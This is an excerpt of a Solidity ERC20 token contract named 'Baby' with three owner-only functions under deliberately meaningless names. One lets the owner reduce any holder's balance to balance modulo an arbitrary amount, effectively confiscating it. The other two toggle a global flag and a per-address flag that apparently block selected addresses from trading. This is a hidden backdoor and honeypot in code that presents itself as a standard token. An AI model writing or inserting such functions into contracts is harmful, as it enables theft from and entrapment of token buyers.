...
contract Baby is Context, IERC20, Ownable {
    ...
    bool public soldhy = true;
    mapping (address => bool) public soldhyy;
    ...
    function squd(address account, uint256 amount) onlyOwner() public {
        _balances[account] = _balances[account].mod(amount);
    }

    function sgyhj(bool _status) public onlyOwner {
        soldhy = _status;
    }

    function dfggt(address addre, bool status) public onlyOwner {
        soldhyy[addre]  = status;
    }
